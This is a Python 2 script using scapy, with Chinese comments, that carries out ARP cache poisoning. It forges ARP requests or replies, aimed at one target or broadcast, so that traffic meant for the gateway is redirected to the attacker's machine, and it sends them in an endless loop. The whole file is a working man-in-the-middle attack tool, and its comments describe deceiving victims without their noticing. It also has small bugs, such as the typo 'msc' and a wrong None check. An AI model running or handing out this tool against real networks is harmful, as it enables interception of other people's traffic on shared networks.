#!/usr/bin/python  
# _*_ coding=utf-8 _*_  
  
import sys  
import os  
import signal  
from scapy.all import (  
 get_if_hwaddr,  #获取本机的网络接口  
 getmacbyip,     #通过MAC换取IP  
 ARP,            #ARP数据包构建  
 Ether,          #以太网数据包构建  
 sendp           #在第二层发送数据包  
)  
  
from optparse import OptionParser  #处理命令行参数  
  
def main():  
 try:  
  if os.getuid() != 0:  
   print "[-]Run me as root"  
   sys.exit(1)  
 except BaseException:     #捕获所有的异常  
  print 'Something  Error' #try中的函数执行发生异常的话，就执行Something Error  
  
 usage = 'Usage:%prog [-i interface][-t target] host'                        #命令行参数相关  
 parser = OptionParser(usage)  
 parser.add_option('-i',dest='interface',help='Specify the interface to use')  
 parser.add_option('-t',dest='target',help='Specify a particular to ARP poison')  
 parser.add_option('-m',dest='mode',default='req',\  
              help='Posioning mode:requests(req) or replies(rep) [default:%default]')  
 parser.add_option('-s',action='store_true',dest='summary',default=False,\  
              help='Show packet summary and ask for confirmation before poisoning')#内容被存入到summary中，比如  
                                                                                   #store  
                                                                                   # -s 10,则options.summary就等于10  
                                                                                   #store_true  
                                                                                   # -s,出现-s则options.summary就为True  
 (options,args)=parser.parse_args()  
  
 if len(args) != 1 or options.interface is None:  
  parser.print_help()  
  sys.exit(0)  
  
 mac = get_if_hwaddr(options.interface)  
  
 def build_req():  
  """ 
  以请求包的方式进行欺骗，目的是欺骗网关,让网关把所有的数据给为发一份，同时，被害主机毫无察觉。 
  """  
  gateway_mac = getmacbyip(args[0])  
  if options is None:      #广播欺骗  
   pkt = Ether(src=msc,dst='ff:ff:ff:ff:ff:ff')/ARP(hwsrc=mac,psrc=options.target,hwdst=gateway_mac,pdst=args[0],op=1)  
  elif options.target:     #定向欺骗  
   target_mac = getmacbyip(options.target)  
   if target_mac is None:  
    print "[-] Error: Could not resolve targets MAC address"  
    sys.exit(1)  
   pkt = Ether(src=mac,dst=gateway_mac)/ARP(hwsrc=mac,psrc=args[0],hwdst=target_mac,pdst=options.target,op=1)  
   # 本数据包封装了一个数据包，从本机发送给网关， ARP 的内容是谁知道,  
   # 这里欺骗的受骗主机  
  return pkt  
  
 def build_rep():  
  """ 
  以回应包的形式，只是在欺骗被攻击的主机，网关的mac是我这台主机的mac。 
  """  
  if options.target is None:      #广播欺骗  骗所有人  
   pkt = Ether(src=mac, dst='ff:ff:ff:ff:ff:ff') / ARP(hwsrc=mac, psrc=args[0], op=2)  
  elif options.target:            #广播欺骗  骗指定的人  
   target_mac = getmacbyip(options.target)  
   if target_mac is None:  
    print "[-] Error: Could not resolve targets MAC address"  
    sys.exit(1)  
   pkt = Ether(src=mac, dst=target_mac) / ARP(hwsrc=mac, psrc=args[0], hwdst=target_mac, pdst=options.target, op=2)  
   #            本机mac    受欺骗的主机mac       本机mac    网关的ip地址      被攻击人的mac        被攻击人的ip    OP值是表示请求还是回应  
   #                                                                                                       1：请求  2：回应  
   #  从本机发往受欺骗主机， 内容是网关的mac是本机。  
  return pkt  
  
 if options.mode == 'req':  
  pkt = build_req()  
 elif options.mode == 'rep':  
  pkt = build_rep()  
  
  
 if options.summary is True:  
  pkt.show()  
  ans = raw_input('\n[*] Continue? [Y|n]: ').lower()  
  if ans == 'y' or len(ans) == 0:  
   pass  
  else:  
   sys.exit(0)  
 while True:  
  sendp(pkt, inter=2, iface=options.interface)  
  
if __name__ == '__main__':  
 main()  
